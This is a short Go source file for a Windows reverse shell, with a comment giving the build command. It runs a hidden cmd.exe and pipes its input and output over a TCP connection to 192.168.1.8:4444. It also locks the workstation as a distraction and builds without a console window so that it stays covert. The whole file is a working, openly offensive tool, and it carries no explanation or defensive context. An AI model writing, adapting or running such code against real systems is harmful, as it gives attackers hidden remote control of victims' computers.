// vim reverse_shell.go
package main

import (
    "net"
    "os/exec"
    "syscall"
)

func main() {
    cloak := exec.Command("rundll32.exe", "user32.dll,", "LockWorkStation")
    socket, _ := net.Dial("tcp", "192.168.1.8:4444")
    dagger := exec.Command("cmd.exe")
    dagger.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
    dagger.Stdin = socket
    dagger.Stdout = socket
    dagger.Stderr = socket

    cloak.Run()
    dagger.Run()
}
// env GOOS=windows GOARCH=386 go build -ldflags -H=windowsgui reverse_shell.go
